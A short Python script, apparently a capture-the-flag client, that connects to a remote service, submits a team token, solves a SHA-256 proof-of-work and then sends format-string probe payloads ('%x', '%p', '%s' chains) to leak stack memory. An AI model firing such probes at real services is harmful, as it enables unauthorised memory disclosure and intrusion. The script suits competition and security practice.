import hashlib
import os
import pathlib
import queue
import re
import socket
import threading
import time


HOST = "1.95.116.62"
PORT = 10001
TOKEN = pathlib.Path("token.txt").read_text().strip()


def recv_until(sock, marker=b"< ", timeout=20):
    sock.settimeout(timeout)
    data = b""
    while marker not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def solve_pow(suffix, bits):
    mask = (1 << bits) - 1
    workers = max(4, min(16, os.cpu_count() or 8))
    done = threading.Event()
    out = queue.Queue()

    def worker(start):
        i = start
        while not done.is_set():
            for _ in range(20000):
                prefix = str(i).encode()
                digest = hashlib.sha256(prefix + suffix).digest()
                if int.from_bytes(digest[-4:], "big") & mask == 0:
                    out.put(prefix)
                    done.set()
                    return
                i += workers

    for start in range(workers):
        threading.Thread(target=worker, args=(start,), daemon=True).start()
    answer = out.get()
    done.set()
    return answer


def connect():
    sock = socket.create_connection((HOST, PORT), timeout=10)
    banner = recv_until(sock)
    print(banner.decode("latin1", errors="replace"), end="")
    sock.sendall((TOKEN + "\n").encode())
    prompt = recv_until(sock)
    print(prompt.decode("latin1", errors="replace"), end="")
    if b"already in use" in prompt:
        raise RuntimeError("team token is locked by an existing session")
    match = re.search(rb"sha256\(\? \+ '([^']+)'\)` ends with (\d+) binary 0s", prompt)
    if not match:
        raise RuntimeError("failed to parse POW prompt")
    suffix, bits = match.group(1), int(match.group(2))
    start = time.time()
    answer = solve_pow(suffix, bits)
    print(f"[pow] {answer.decode()} in {time.time() - start:.2f}s")
    sock.sendall(answer + b"\n")
    boot = recv_until(sock, timeout=30)
    print(boot.decode("latin1", errors="replace"), end="")
    return sock


def query(sock, payload, timeout=8):
    if isinstance(payload, str):
        payload = payload.encode()
    sock.sendall(payload + b"\n")
    data = recv_until(sock, timeout=timeout)
    print(f"\n[payload] {payload!r}")
    print(data.decode("latin1", errors="replace"), end="")
    return data


if __name__ == "__main__":
    s = connect()
    try:
        for payload in [
            b"hello",
            b"%x",
            b"%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x",
            b"%p.%p.%p.%p",
            b"%s",
        ]:
            query(s, payload)
    finally:
        try:
            query(s, b"exit", timeout=3)
        except Exception:
            pass
        s.close()
